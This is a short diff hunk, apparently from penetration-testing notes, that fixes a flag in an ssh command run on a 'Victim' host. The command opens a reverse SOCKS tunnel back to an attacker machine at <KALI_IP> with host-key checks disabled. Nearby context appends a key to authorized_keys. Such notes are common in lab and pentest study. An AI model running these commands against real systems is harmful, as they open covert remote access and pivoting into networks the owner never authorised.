@@ -254,7 +254,7 @@ cat key.pub -> copy
 cat key.pub >> ~/.ssh/authorized_keys
 
 # Victim
-ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -I key kali@<KALI_IP>
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@<KALI_IP>
 ~~~
 
 
